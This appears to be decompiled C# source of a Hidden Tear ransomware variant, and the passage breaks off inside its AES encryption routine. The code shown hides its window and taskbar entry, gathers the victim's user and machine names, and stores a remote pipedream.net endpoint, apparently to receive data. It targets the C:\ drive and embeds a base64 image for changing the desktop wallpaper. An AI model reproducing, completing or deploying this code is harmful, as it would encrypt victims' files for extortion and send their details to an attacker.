using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "https://enfiniql2buev6o.m.pipedream.net";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\";

	private string backgroundImageUrl = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxISEhUTExMWFhUWGBoXGBgXFxgYIBgaGhcaGh8dIBkYHyggGholGx0XITEhJSorLi4uHR8zODMsNygtLisBCgoKDg0OGxAQGy8lICUvLy44LS0tLy0tLS8tLS8tLS0tLS0vLS0tLS0tLS0tLS0tLS0tLy0tKy8tLS0tLS0tLf/AABEIAKoBKQMBIgACEQEDEQH/xAAbAAACAwEBAQAAAAAAAAAAAAADBAIFBgEAB//EAEwQAAECBAQDBAcEBwUFCAMAAAECEQADITEEEkFRImFxBROBkQYyQqGxwdEUUuHwFSNTYnKS8TOCk7LSQ2NzouI1VIOjs7TCwxYkNP/EABoBAAIDAQEAAAAAAAAAAAAAAAECAAMEBQb/xAAvEQACAgAEAggHAQEBAAAAAAAAAQIRAxIhMQRBEyIyUWFxkeEUQoGhscHw0fFS/9oADAMBAAIRAxEAPwAUxCRVuof1YBkJLCr25wSUhRLgORVr+7WHpikolUQeMVBV6psCA1j+Ee2cq0PFC83EshKAeJBuNfxFuYgUiRqQCWokkChpmL2H9YHNkqS2ZJD2cNBhMzUOUFQ4lF3I+Z6CsSqWgRSYACWLhyx5Q1hJi1cIQpZHFwpzHQaC1q84JOQhCCwCswYKN+Zb2Wtqa3hcSyJOIJBYy0/+4kwbUl9aHgrdDCOzMStWZUiar+JEwDzpSPYrsuaFMmTMAYPwLLFqh2q0UsmSuayUoKiNQCWHNtOZhlPZ85AfuZjlwE92rzNPIQ7w2nrJeX8y5YaDnsyf+xm/4a/pHZfZM4kAypqQdTLXT3RTplMXUGY2Iq40YwdQWlCVhBCCWBUhwD+6oht6cjFjw5cmvT3JkReT8DNSWEqbVwsCUsAGzppTpaK89mT/ANjN/wANf0ipTJUrMQkqaqiAS3MnTqY7Jlu/C4Ac8oiwXH5vt7hyIuJXZOIJ/sZo592v6QTHdnTSQBImuAxIlrYnyqedtoqsPKmKdEtClhrJBN9aWMKzpCkHKtJSRcEEHyMRYTcu0vT3D0a3LiX2dPBB+zzC2hlLY+6Crwk+pTInOq6lS1EtsGTQfmkUsuSFuEpLgPv5x39GT/2M3/DX9ILw9dZL09wrDTLBXZk//u80f+Gv6QSV2LPcEyZjPYoXbyipkSE0K3osJyga3IL2284axEgzScrqKHKyEWA6aUNTvEcJLS/t7kyIvJsjEOtXcTgpT1KVHLyQAKdTYecInsaazfZ5vqZs2RfrEOAAzXo17mkUSyQslmL2I/N4an4YpZK05QwVXgDEXAurrWFWC48/t7kUEMHsrEfsJv8Ahr+kWKDisheRMUqgR+pXwhi5DBgWpTeKQyHeWhK5pFRlSeGzkM5Is9hC83CTZbKVLWhjQlKk16kQ7ws2ja9Pcbo0+RfnseclOZciatRLKASt0A2alVeYFjeFUdjYl3TJmgA0UZax7m90VC51XCQDqQNflHUYGcsZhLmKB1CFEHxAiLCkt5L09yKCZfLwSwUqGEmlSdQiYlJIsSMrmuxEKS+ycQVFSpE1qk/q167MLwgrsmekOqRNAAestQ+VIWnKzAcqfnnBjhP5ZL++ociRbS+zsQHBw84pOndr+l4LhsFOSD/+tNzByhfcrcHmGY8jofcp+jV926JSyhQ4VJQVFZ8uFINxy1hM4KbL4lyVhIuVIUAK7kUrAy5vmX99Q9Gu5lzJ7GnIT3kyRNWovlRkXX95RAcDlcxztLsifT9RNejgIWWJDkO1QD5VEVMmcXAHEqyWSSqpsPEnnWkMS+y55vKmJYnMTLV6o0FOtIDhJO3JenuRQQST2XPD5sNOIOolrBBBuDlic2RMUsCaDJQliStJSa0eoGZRY15HQGKkpSokBJTdq7aEaRbYjFFMrDJKUqAlFQCgSx7+dUMRyoXFBSDOMlT7/wDPNkcVVoD2wlIUKBCqhSAoKysWFRQEi4+DwrKkhsyjwu1Lk/KGsOlZKi4ExTLzKtlLkl2YG1eovHZKM65hSHSEuoAeswAdtHNfGInSorApQVpJJCJY95+ZhfEJSKANYguS4IvXW0EmYlyaAp0BFGFrQzKksEzVqQHLpck2p6qUm2x5Q10ErUKYgsCxdjY9eUOfped94fyI/wBMT7RRnUkIdasrqUEtmqWpyDByzwp9kmfcX/KfpB6slckHQ1C0FJ2Ig+FDuWC1uGClNStbh6tAZhck7wMiMbVowDeLmgkpRQZySXJd6P0gE9JSWLPE0LCQ6aKt05jn8PgKXLKqsSNWiJUQ7LXmUM1WDAU09255mDqknusQHzFUtJzPRhPla/HaByEgKKeEvY30g0nEDuJ4NOAOyaEGdJDXvfz5QHdqu9fksw+0c9F3QnErSoOJJII0KXOo0pCcr0jxRNZ6uXCiv/LD/owUqGIzOiX3JtVk1c6uYTxGFwASoonzSoA5QU0JagPBZ4bqPFlmje3K+RvWbIqdb865lVNKlqKlUqST1LnxjXpw/ednIlgF8i1p6omO3UxjUkGhJ5a+4xrpOJKJOBW/ClSwoqpwklJJ8DbpB4tOo1yf4TBgNW77v2ir9GEgycXVh3NdWousVaiEMaZUl0gEErP3i2n9BGllYISPt6Ehh3RYbBlt4M0ZBCHd3bcaQ+C1OcpLbT8IE01FJ+P5NPj8QvCSZMmUcq1JEyaoAPXZw1wR0Aiu7W7YE6UhMxGaYklprgOnZgKl9KWG8Nem5fFBLsyEhzQVJ90Uc9IAIBNDUHX94N8Ol4HD4cZRjNrV635jYk5KTjy2JTzLSKBRBFwwcdS/lGq9Je1MQjEZZcwpGRKgMqSCXL1IPKMYQ1wWMfQO3Ox+/mDLOlpUyeFQcsHrld/6QvE5Izg57a769wcJScXl30/ZQekqyqVIxI4FzAUzMrhynX3K8G2gPofPSibkWQZc9PdqqLl2DXLmnjBPSjES1JRIlElOHGUqZgpZLFuYY++M6kkEEUIL9CIswsPPgZXpd/RXp6aElKsS1/d5bSOxyvFCQXGVeQ/wJDv4pD+MF9K8WF4hRI9TgQnknVtsznyjRTcUkS1Y9AAXMkpQkAOe8JymvIhIp90xiFYcl6lSxdi7V1UbnkIXAk8SeaXJV9ef6DiJQVLnr9ORcehCz38wvXuVl/7yIZ7A7axEyalE5YmSZnAcyU6igoKncVo8B9CJX6+YCQHkrHTiReH8FhsLhimavEy1iWHTLQQoqU16HettqgCK8dwzzTVulWl9+w8M2WNbWZTtjCCTPmyxZKyB0uPc0WPo92viEKly0TWQFp4CEBwpTmpG598V+LmmdMVMU+aYoqpYOT7h8BAcB/ay/wCNP+YRtlDPh1PV19ypS63VNV6V9s4hOImyJa1ZaOMqS+ZCaCjtU15xkZ0pQOUs7CgY3D6RofSnENi5wIGUBLjVRyIYPe+lmeKNRuSeI1Uda6CK+Fio4caXJfXQOI25u+802Mx8+TgcKZUzKTnCmY0BO4Noz2M7exM1BRMmlSSzjKkOxBFg9wI0xk4b7DhTiJi0Bl5Mod3Jd+EtSM/2lLwiAk4dSpqnObvAQEjSmVL67xXw+S3cLdvWvF8y3EzVvpS5ldLKpeWag1SQQQPVUK1B/JjY+kPbOKlDDGXMPHJSpVElyQHJcUjJS0qmOVE5E6CmjslIo7eV4uvTI8OEYljITTwF4sxoxniwUknv+BYSajKgvpM06RJxSUgTJh7qZl1UH/0nwIGkJY7Aq7rDsxKZLKALlLz51Toz0obw/gyB2WSpWX9dQipD9LUKh4wDtOa0vDqBdIksn9499OqenPlFMW0si5Sa/IMZ6X3pFM59RSiEvUVIHPK9YsVNLaoEtBCkgKBVOULKOU0T8BS8VZiJTGhxszBkJSQSQSbkCnlyjgxLJKQkMWLEvUWPIx7CSlKVQs1So2SBcnlBJ0lCg8sqJdiCAHcEuADQBtdxEdXTIGWpOVRKQUlKa5mKlOKM9G4qNpBf0snYeSv9UJS5CUkGYaapSeL6A9Yb7jBftZ38g+sVtR52yF3IklVmAFySwEGxkpKUsxzE0NqDUAaHQ6sbQGckgsQzaQVKO8JUpQSkeLAWAEZnvfIwiakxNM1Wj9AKN0FIamLQpBSkHhqCo+YYWfqYTSoguCxGohk75BG5MxOQlVicpCUB7Eg5sw5++F5aP1OIJt3aR1/XyY4ueos5dtGAHkIMohUqeXYd0kNt+vk2gJNNea/I+H2jvoyolGL27gsPBUU2HlBhQGpzP7IHw6w/2b2kcMVAysyVpy5SWpq9C+zQ/L7akqLKwcoPU1Dlq/cqesO88Zyajadc13eZt6sopN1XmZdXK0aLtGaPsGFzDNVere0q+8VE+a+YtlSp8qBYAn5bwXG44qkSZRQwl5iFP6zkn1WpeLpxc3Hwf6YsWkmvD9mmSvvcNMxGq8KUK/il5gfN/dGLmGnDb584tOz+2+7kTJBQ4WFAKdsuZLGjV3iqWoMw8TCcPhSg5XtenkPizUkjQemCwpUqdlBRNlgi4ZQqajkU0ihmSJikGbkORwnMBQEAMPJotOzO2giX3U6UmbKBdINCnpQ0v5mA9s9tGcEy0oEqUmyE/E093xg4KxIVCtFzvl/oZuErlf08SqSssQK8meNT6S9oGTjUTAHCUILWo5djuQ48YzwlFNBQtVegHI6w52vjTiZhnd3lTlys7mj1FBZ9LQ2JBSmm1pT+9CxlUX36DfpgnLMC0H9XNGdJ63rvr0Iigm2D3+UWc7tZ8PLkkZjLJIV+6dG8fcIWloUwKbqDleiQ5DA6GlT4QcFOEEpcvv3fYk2nK0WGJ/7Mlf8AHPwXFLicQVUFAPMnc7mLPFdpd5IEhKSyFZ+8J9ZkkVDUd7vFNDYMWrzLm36hm068kX/oV/bTP+Av4piilIDBRttvFl2F2gcOpSwjOVJVLZ2Z2Lux2+MJJVcEuBSuu39YkU1iSfJ1+wuSypeZIqUpJCQEp6xLDSkpXLuSZiGOjZhUDbnCs8uTytyg4m5FpUUuQUltAEl2B+cWNOtBVuO+mX/9k3+5/wCmmKxM+3CCoUB/DWGe2cUcRPVMCWzsyQXskJ2G0JTZZSWPX8QReBgxrDjF7pL8DTacmzRdr1wODJ3mOduIxnVuKBwNOf1jRdn9vJMlEleGRN7t2zKu5JJCcp90c7Z7alqld0nCIlqUAzGqGVoAkEEh/PWKMJ4kHky83zWzd95ZPK9b5FBNmPlAfMksnLq/wU+uvhGl9J8OkJwqluQnDpcA0oBQqGpLAAedIzuFllC0qWgKSkgkKIYgXBNY0uJ9JZS8qDg5SmHCFKFALAOjqwg42bPFwVpXzQIZcrTdWJ41Jl9mSUkMZk0r/u8THyy+cJdpKHd4ZrCTT/HnRPtvtadOyrmDKzpEtiE5bvlNdq8gzNEMUWl4b/g//fOgRi1FOW7k362DEkmnRzs/DfrGJKVgEgZQqoDtlUQLbwHFqQokoCmZ6hm3sTw9TSJnFTGyhdDQEtbbMagcnaJSEolqfOVqGiKDxWoVHIJIMHVO2ZhbDzgkKSoEpUzscpoXFSCPBoNgJCKKmH1iUoFeI7lqhAcClT4GIz5BIKwhkmtLAcnqRziEnGLQGSRRyCUglJN8pIdPhDPVdUYjiwCpgjKoOFBLkOCaipNvhC0OplFNrs5XokHY78/AQ3+kZX3f+UfWJma2VksvcveFSnCWrqzWZ99t44mWQSGcH4bvE5vEQiWCU3A1dqk8/cI9OkZUVUXdmFqX6tT8YxXyMAGaQOFPifl0gknAkjMpQSLB6uTakRlAAZiHqwEGlqScymVUMXLi4LDUnbaI21sERmyykkG4g+DnISlYVmdYCQwBystC3YmpdLcolOli6rqNx7PI7neFCIbtIaLp2MScHILsqcEjiUSEED33NtzEMT2fh0e3NOYO+VFvExP7QyU5SzUKWoX1O7ijG2kRTJoVrdtheuvTbeJmknbbLOlZDDYTD5xxTSTqoS6c6q0iauzpC1ZEqmm5KilFdyXLsBpAykCxcb/m0dRMRQkKBH3Tfa9jzHlBblumw9Kwc3s/DhiFzSDrlQK7EZqGBfZMP96d/Kj6wwlIUVLULuoJFH1Ndh5wvMAehcfmkOpS2tk6Vk/sWHNc07plRX/mjk3AYe+eaWuyUU98cSo2FzQH6Q7hsN7a/WNEpoCo+NHtU/GA5yjzD0rFv0Zh2DzJwFyMqDlfVs1o9Ow2GSlI72aog0KUp4R1JGtYksAOuvECMqql6g1YONfGFEJd6EtqNIicnq5P7B6Vkl4HD/enPcjKj6x5WEkWCp7X9VDf5oiwLDQDx3iK6AM4fR4e5d7D0rGlyMMlI45v8OVH8xr7j8Ilh+wZS05nnijpdKGV4vC+FCQ6ljMLAO1d/CDhAm8IcJSSta1twggCgFhQU1LQjc1tJ+ZOlYmrCYcOM08b8KP9UeGHwo1nHqlHyVB8WlCklaQoAKCQVEcVDo1CGG94TTQhw42qH8osUpNbsPSsfw3ZEmdVJn7PkQwOgobQCbgcOkFKlTgXtlluGv7UQmTUBBSkK4iCczUbZrnnTpBl4JIzJ4nSkErehJagDWLli+j2hc0k9ZMPSs7h8LhgnMkzTot0ocA6etQHce7UUvs6SpgFTsr0LS2D83vygIUCQlqQU4s5CKO7JADZQzFm3FPOD1+TD0jAKwuFcjNOP92X9YPhcPhQFHNNzaOJYpV2JV+MdODShI7wF1FnH+zN+Iaq/dpR9bIEQybku0w9Ky1w2Bw81JJVOCJfETkQ3RgSXhPFYPDA+vOVmGYEJRUHqXGoblBZGNSlMv1nlkkJADKUSS5U+zAhrCASsEbr4Qz82HLSFi5Ju2ydIyAwmF+9P/ll/wCqPY6chQlpRmyy0ZHUznjWt6U9pvCBOBavuiDE2HOkW6t22F4jaohB8GxUApmqa2dqP+67QGOPBatCjmLWSUpBzTC4UUtVwAE8NDrbcRxfZrJJzppRXJTtf2g9CoWPgYjhV5UqfhKgyV3ZrppZ7OK+BMHlSlYlyosU5QVbvQBtVnTeK23HyAVkxJHCXppEIbxiklsrhnGVVSlubVHwqIWaLou0MbBatnANx+bwVxMVUlgGSLkgaOdTf6xNEkrdZAbQWzHYPcwF24k006P+bxzt9tznksQoBkkD+Eez/euVbwETi4Zg1hpEVVjiEOWcDrDJJIIzLlJzHlU6tYMNy5YdY9jPVdQSCWygCvNzchqV1taPGaUfxszs7ci94XAUtVS51JhUndhARNCVLVepuSWpck8hBCEqoKHTn15wFKiC4LERbYRiYtCUhKWUkvmNlOLEbDbxeFZYF1Wg+FZUwOl3NABR9KD2eQgmNKSQCXIu1h+6lqMN4VOnRCCsQpyCASaOL1pTS3KAFkijE6vty+sRmKc+4RJW6rn8v1hkqCAMNS8cwTmQFKT6qiTTWospjC60N8onPwyk36Fi7HY7HlBdPcISfMy3AUsgElQcJBDgAWdrn+sRxEwXl0Q9tX5xxU4KACqZaAgC3PUwXBYQzT3cvWqlGwAhdIq37DJNukKguQEpJJsA5ryapEW2E9HJy+JWUHZRtzOXTlSNP2f2SiQjhFTdRueZ2HuhgmnLWMOJxremGbsPhF8xmU+i6qjvEqBq2UjyY0hef2LPQCAhExB9lKiLFwasXfrGr+3Sg6RNTm3Ck15M7tE8pIzU+vSKlxWKu0WfDYb2MFMQApPeAZgcqZbEBNqNfUdYVxqSVByFLauUeQZto+gY7CImJr67cKgASnzjFYrs9WHXx8SneWzsr946sNrvyjbw/EKfn3GTFwXh68iskzMpdgaEEHUHpE52LUoJFkp9VIdh51JhpGFmTXdJKqnM3jWK9QjWqb8So73mwaOIKkLBFFJL1GvSGJDIAWzkkhx7H/VqPy3k51ijBKaZlEJvYFRueUG/QJES3JplSakEu3Pe7trA5jZS3qj1SbkvU9G+UQUFJUQaKFD+dYewKFsqZkKyGADPlFTmbk1NHMButQlYQQ1wbjTxiXeUyual1Eufzv5QfGqXRKiVVKgS5NWcV6QoRFi1VhLGbhAElIArZRYmZYumrIl876coXmpKEpKfVPt7kG3SGcGvvcwWXYOEimYD2Q3qp1LaQvisYTmAcJUACg2SU6JawGnUitzXHNdP+/v7wgrNIUQwqbgb8vpB8qUA+qpftA2A2G6tyLaamAy5JVawuTQDxgxwTkJSoFRDgGjl6AE2J57c4dtbWEAJhS7DgJsoOP6xydiVKSEUCQXCUhg515mDz5oQkykFwTxq+8RoBokeZ90LSV5VAnQvDLXWghVqyfvTDUk1Z/iecD+2TPvH3RJckFQ40spTPs5uRFz+iZX7Kd5iElOMdyWW+JxJqkhJT7LaDl+NXhNUTWp7wxh5LFze5eyRueewjIqijALLkkB/MbR0zUj1U+KuL3W+MMYoBJo7jcvnB1Ox9ze9aUplPlBa4IpBTtWElLSJh4lHMeT2G708oF3CtK8xBZ2IVUBXD0CabEJheCrCSxBr8esFkYIKAKlZcxZAZ353oNIAUkNTnXWHpuLBSSkEF2qxyuK5doEm0kkErVpIJGocfKIRYzZQaqTRAOfckUA0Nab3hAiHjKwkpaQ2YxBZ0NTvEsw0FTSGpeFAHEHLspj/AGYu/wDF7tL2jdasgLBCiilgsWJsBqz0zbeOrREyVKUWYAh1EPlYXPzbyjuYKOQDh0PzIgYxKgkJBYA5qancwNbtBBz5YFUl0m2hpoRoY2vo/gRJlhxxK4lddB0A+e8ZTsmQFzkAh3WHHIcRt0jdKjJxs3SgbuDhvIDj8dkGYhza7P1NgALn5xh+1cXMmEZllSTZgQm/sjUDc1h7tnHvPWFOpCRky6Ft9uJ6itBFfmCluqp0GnJPINFnDYPRrM0V4+M5SaWwvKlJfitq35tFjhO0pssgSyFEvwpBKQnZrb1uN4r5uUEs9dNvrEcNMyqBq2rMXGoY0L2jVKKktSlNp2jfYDFJmoCgagsoCoSpnZ/a6iAdudnd7LsVFHEkAs9Kh9HHyih9HsWTPA9WWRkZ6J1DbqKvGpjXzQ3LlHJxYvBxFXmdPCl0uHqYPHYngSA2ZQZkmgD1LfeNnuwO8K/o85XJYtmYhqO19/CGJ0sSZ0wkUSpSQB+9byBgE2YZjDMrIkVJPMm1tWEdSO3V2Oa1ToSUCHFtxDkxctkkkFCQMssO5UwfNRhW51DNyWnrzKJ8vhAiIuqyBVpMwlTuokki3kNo6UlKCFULjKNefhAkIKiAA5hiZJSzVJZwsVBIuG20e78oj00CKy5RVbS5NhBkYOmZR4TQKTV1HQDXnHpfEkJDOC7H2vr0hmfiWGRGbOWDJsm1EtU/ibwJSd0g2VqgUquxSbg6g6GOSikesCdh9YfRhkgKQQ6gCpShaWQCyX9oksDzIazxXEQ6dhQ/hEiaQCCAk2SKEdCQPHZ4SxXrq4gqtxY9H0hqZiwZYQgBJJ4wB61mbYbp38gfDYNMsZpgSVZgCM4GQbn969K2hM2XV+hCvmSFHiJdRqQaltzBez8DnLm3xgc4EHOkkg1B18YscNjkEOUsU1IFB5fSDKUlHQIj2jgwniT6p01EIZYs5a+9WSopASCrKoEuA70GrOfhaCd1g/vL8z/ogqbiqdsNl4UlTkJsHLac+UQKzZzd/GG8QvLwgFOUuCDfmdzzhRUZIuznhcLJOYUuKHQc+bRNeYkZA9HJHtdfzXrEJanTlBb/AOX4xIDKhSSpJSahjUqFqXs94V7hFJjaf0guHkBTOamyRcnZ7JfnEhKKuJRZ/NXQannAs+Uummz8w0PdqkELPm1CEpSQKMzudTv4wEzlA2AZwzUrQhukEBCU2fMGJGnIfmsekyyqqiAPVBOp2/E2pAVIJ7NSoDJrlTRn+fMwHELehFaEUZuRjygpCtQYExJhkuYSKVEEEUIqDBErdbs2pbpVhz2icvD5gagAe0Swfbr0gUxBSprEbfnaGtMJNWJDEJQACOp84GlAAzKF7Df8ILhcpUMwKlEs2nXn0pBsWTNICVAhIb7opc7BPyaBdOiB/R6eVYiWktVxb9wxtAUgcq6Xp7oxvYWAmCchYDyw/GLHhIo9XejaRrlKJvWOZxtPEVd3+nT4NNQfmfO+0f7WZ/Gv/MYiJ52BNgdfOLTG9h4hUxZTLcKWojiTUEkjWAL9H8QP9n5KR5XjpRxcOlcl6mOWHO3o/QChIRmYp7wXcAgDVI0J35OBzAUO6kJISLm7Pz2/CLDDej88qAKMo3zI+utoPiezcTQIlZMrhgpDMdwTU77wvSwT0kvUHRz/APL9Ct7InETpSSAQJiWd6cQt9I+gilSeIhxy/H89MZ2Z2FPTNQpSGSlSSTmSaA8jGwVUUsNNvwjFxsoyksrN3Cxai7Rhe35w+0TRloSHD65RUbRWzJhUwAYbD81iz9I8HMTNXMKTkUQytLAaW8YRl4chOfqW1y2zDk5jo4Tj0cX4Ix4iqb8z0mQU8TAk+qBVz4RDGOWeq9W1Ph4CPS1ZX4qGlPpDWHmoQkrQCCksCpiVkin8IFyBcMHhm2nYhWOQ4qHofpB8IAkd4Q7EJSndRBvybTWJjD5kZiSFGz1zm5aF5U5SXyqKXuxI+EP2lSCO42ceFOUd7XNlFUgsyaa3PJ2hTDlUs56giw368o7KRQuWChU7Vs1y8SXlmEcQSAAni0b6+6AkkqCElzlTAQcqJSQ6gkeRYkkl6DTpAsWU5QkasUBqpBd3OpJ+UDmTCksl0t5+MOYcFKFTCCqYb1qhDVVuCah9G0eA+rqQrJktSDxApN6gg++H8MoT+FbJbiJSKnKCS4fZ2beFpqCwDugOQrqz+NLQFKlIUCCxFQRFjWZeIxcrWO7LpCUEMhLByfvPctqbaRTTElFga6/IQ0MSZmYqLqAo9X68htAJk5nILk13APKEhFrQiJT8WskjhzKDFWUZi9xm5wk0NzMJlAUpXAqqSPa3vYjV453yf95/NFkWl2Qmlub+ccUgi8FCWqfAb/hA1F4xpnPBkR5JYiDoQAMyqv6o35nl8YhNYtlDUqA962erNWDYQkxWYZjbb5D92FZiyS5iS1E3hjDSAOJZYP8Anx+EDSKCLd21SHGof8tBHTlKUlSszMCLF+pc6U3ieKUAaAA8i4I+vxhUwVrqEIvDsC5dQu1k6VO/IQElrecNTVmYWFEipJ/zKa5iGJCBQDR0qFc3Xb5M0RPkwkjiEtemXLkYtmIqToz13tCqJJNfAPqdomiXqbfHlHV8bNRqNtz6QVpsEXqORg6Z2VHCwPtA+1t1S2nj09OUKa09bV+fKF1pIuGht9yG+wksJloAFAkU8IKRSIYYcKeg+EMZQKX35dPrHCk9TurYHKu28dWnwGn51Mdpb3wGbi0ykKUosBV9unOBTb0DZ1QrHgN4qlekEtL/AKsnLVVagOBpQkEh6+cWMqalaQpBdJqDy+sWyw5RWqEhixn2WHQXPJvd9YhMSAxFjvEpa20rpVvPeCc1B1GwirZlgpi5KTLXmDjKpwdKUJGojBYrFEgDMFEg5lBLOHcJBIByjw2sI+gdosETC90K/wApj5mBHS4BWm2YeM3Rwc4OmUE1WXRoAfW+mj9IjKlC5oNNHPyHOOLm0Zme40B3G0dB67GQnPxBOoJ0YeqGZg9tICJL0FVC/wAILJQBVRYHa/htDUtkgqIyy0swBqtRtXo55QG8uxCqUlixgvft6iQnn6x8zbwAiU9aVBwnKpy7EkEUb1iau8CQopLsHGhAPuMPugjmAw+cKWXJFlK9VJ3UT+R8EVzXDKqdDt9RBhOWo5iv1dSaDkw+AETmSAosMoJIZnsQ5JGghVo9f+BASUO7PaoNvE7RyZhSL1ezV/pE8UCDkAIA0+8d4lPLIyCpFVHbQDpUQ1sIjDOFWgFIyAkmpUXF9E0Hm8GmCWJaeF0qfi9oLDPyy1FOb3hEp98N2kEsZ0tawVzVKyj1UJZ8oo4S4CUDdoD9mkftj/h/9UdmdoOLHNlyOVOAMuUkBqEppfUwl3Z2PkYWKl5ehEbZR1sNQdTtzEDRIIBUU0AcfXpHZDZqsaFns+gPKDYhYfNmGYjib4UoesYdnRgACaVJIUxGhIsX0O0SloUhKqFJuF71s+oN6QKavNbwEeKUihc78oag2DUkl1AMBdrA/nSI94WINQa10O4hzGkClzoNEDk1CTv84RIhou0Q4EvEkI2q358Y89vlBJxy0Fzc/SC2EWeIw4jB0ckWzZauzP0dqwCYgM4tqNvwgqSCclV4SHHw5wOqT9YPRmozcnJbzvHpElR4mDAGqiwoPfEugk8NhgxWoO3sC9bdBzjmPmOlltnFWA9Ufd5HX8TC6ZqgcwJB3BgSqxFHW2Q32HLJT0Hwgwqdt4jh5fAkktQfDlHlJYtHEe53lsTWvQW22MVPpJhSqQbsCFECpIDv5X8ItUgNrHUqDcvnBhLJJNcgTjmi0YFU1c0NwpSTtVR5tVR+fONV2AnLISGIBcsdQTQnrdtIyilPiBsJoAHLPtG/l3JN9H38dY28ZKoqP1MXBw1bBKQRcRITdD0f8Y4p684hGHc6B3EuUL0ZKn8j7o+fokKCXQmhHrnbcC4TzjfLsq3qqZ7PlLPyjD4yeAFAEKWv1iKgDYGx8KAe7dwV6peBg4zdFcpVGu1j9OUFlJATmFGudRyA57/CIyZb1NALmJrSksXKUuRZ8pvba0dJvkZACJRU7aVbVvm0EM8+okApsAQ9a15Gpg4nGWhkqQVZgQUgEgMXckb5W1vEESsqnJ4hVSdQCL8yLkfiwu9wjGDw3djMfXUDkIZWSrO2qhtp1pCuLKlhOYfrN9VDc7mPSzkBBWCk6DUsztpSBKGW1SdeXLnvtES1sgulRHzBixwkpThYGb+HyalqQFeAKUFSiAdE3J58h1hVEwi0M+stAllj8SCcktAzAkBQLlvGw+EVsvMhRqUkUP0O7wRE5KQzPmHEbHoNh8Y4QVgOQAKB/wA/0iRWVUFBgJkyuXOlNMoGl/VQ1DuIh2lMOYoNfVIBvLJAdIbTRumsLTKFtoaw0pKU5iWJ3IBA3H1g0lqERmyyksYjnO584dmYYGrtLSGCmd3O276aQL7J/vJf834Q6kg2adQYkREiGpZAQ4D1ZT6u7MdLQuoRiTOcFw2GJ4tAatdxVhuTHpwSOIOCa5TofpETOLAVBFiC1L/HWCS5bOSxXdlaDV91NpCO7tjCeUmOoluQCQAdYKsglgGGnL6xBM5gxSCBZ3p5EU5RZbIcxCEizggsUmvi8RwyUlXFatrmmnODyXKzmHGapcUe7kbNbSF5qgS4Db9eW0RdwRleKfhAozKJDUFhyanMwnMQNHf4+UTMzcO99IL3aqKZIezkAMNKl4CWUIsEkF2BbQ18xBZ+IdIFCo3Ipwg0TtetOUexBFGyuxzZbcuTttCxhkr1YSLR19BBcPKCixOjsLnkOcdxQagABZsoq3U6q+Hug3rQTcpIKU/wgN4CCpkUr/SBYWiUnkPhByAptBr/AFjhS3O8hYiPQaaoeGh1fnAYKCIo9HpD94UqfNmYKN3d22eH1ho65J5/n3RIC4vz56NBlOUu07FjGMdkCAiXdGJBra7xxKjUXJgDiuN9Rf8ACr4GPn8iWFFiWj6TPQBLW7eqc3RrDnHzOOlwDtSMHGbosMFJMxTM0sUI97c1mFMWtJbLQV4funrq/wCec5mLUpASSeE0Pxffr+QWVKEviWxWzhB0G5f2msDGzVO2YxVMhg6h5XTzbUQOesFgHZIZzc1fw6QaceLMh2vuz6H8YXIdy3OkWLvYSA5waVNALJBHPV945LQNWsSBHMzHhuzU35QXqEcxU3OciKPWYs0CiGc8kvp+AC8/CoDgFThiCWIWDSjer4k66xDDFncOlQY6WINDu4EcnzTMIADJAYAaD8uX5wii06WxBYjeJDMo5QHewAfygolFamTWBOpLhyHoRZ+Riy7CNfY0oQVLU6gcoQK8VyCbUF2fSFVz8wOap0O3LpBcTNzkVOVACQ97fE/TaBlOY5Q3IjbnAj3yCTlFJzZQpyCGJGUOGJe55dBHf0TN29x+kRVNKFAIDZSDUXO5Bh3v1/sv/Nmf6oDclsQ0K1KZyXI0259YXWpxz+P4xJBrBcF7Z1CSQdjGPYwbi0yWU0Pl9doiDDE8cEs6nM/OsLw6doh4q2ERSI9HReCEkJyspGYs1vl0gEGnQExIhIkRPveHKR+B3iJjhhqCeRLJsIYkYbVn8QHOwB9YxyeWSlqQ4scUr86qPxiuUnQyKpCyC4odOUTSCzi5d1beO/OAx4xa0Q0nZnboyiWtKjlDZg1hqXIbaDTPSGU7ZZgajML+cUIA+zn+OFkElQev9IyfDYcm2aY8ViJUaZXpDJGi36CnviKvSOS1lv8Awj6xlDHIf4PDG+LxDVD0kk7L8h9Y8fSaVsv+UfWMoYiYPweEH4vENX/+SSdl+Q+sTl9vyTVlgbsPrGQMGxXsj92I+Ew9g/F4hf8Aa/pKFpVLSlQCqElgwOzXPMxllCCzDQdPmYL2YkGah9/lF2HhxwovKiqeJKbuQCbh1JAJF/dqx2LVrEkMsgKLEkDNyJavTeJYtRzzQ91F+fFC0WK2hCwUsoqQUIDhEs0KjZyNRuT0HJREghIXmb3s+42Mdw4BUl6/kwxiEgJmf3PjC9l0ESmrHsmnT4cobl5UywsUSaK0UtWwVojmOYLmEBEl+s2gLDo9odxvQJxKC1qXZ/eNYiC7AUBhnH6HV1DwiOCHrHYRL0sJb4fBhCRz1/HeKztiYla2QmqQxO/53hnAqJk1L8RiuNh/CT4xVhp5m2RCoLQzg5iJZCzxKeiR7P7xehOw84Aqw8YgY0tWhh4zzMLJAKg/6xRsnck2HWztA/0fP+4rzH1g8pI+yzC1c4r/AC/jCDQkedEP/9k=";

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
